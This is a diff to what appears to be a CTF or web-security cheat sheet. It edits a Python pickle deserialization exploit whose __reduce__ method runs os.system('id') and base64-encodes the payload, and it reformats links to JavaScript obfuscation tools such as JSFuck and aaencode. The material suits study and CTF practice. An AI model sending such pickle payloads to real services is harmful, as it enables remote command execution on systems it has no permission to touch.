@@ -1371,7 +1371,7 @@ import base64
 
 class Exploit(object):
     def __reduce__(self):
-        return (os.system, ('ls',))
+        return (os.system, ('id',))
     
 shellcode = cPickle.dumps(Exploit())
 print base64.b64encode(shellcode)
@@ -1866,14 +1866,14 @@ xxe.dtd:
     - ...
 
 ## Online Encoding / Decoding
-    - http://monyer.com/demo/monyerjs/
+- http://monyer.com/demo/monyerjs/
 
 ## JSFuck
-    - http://www.jsfuck.com/
+- http://www.jsfuck.com/
 
 ## aaencode / aadecode
-    - http://utf-8.jp/public/aaencode.html
-    - https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html
+- http://utf-8.jp/public/aaencode.html
+- https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html
 
 # 密碼學
 
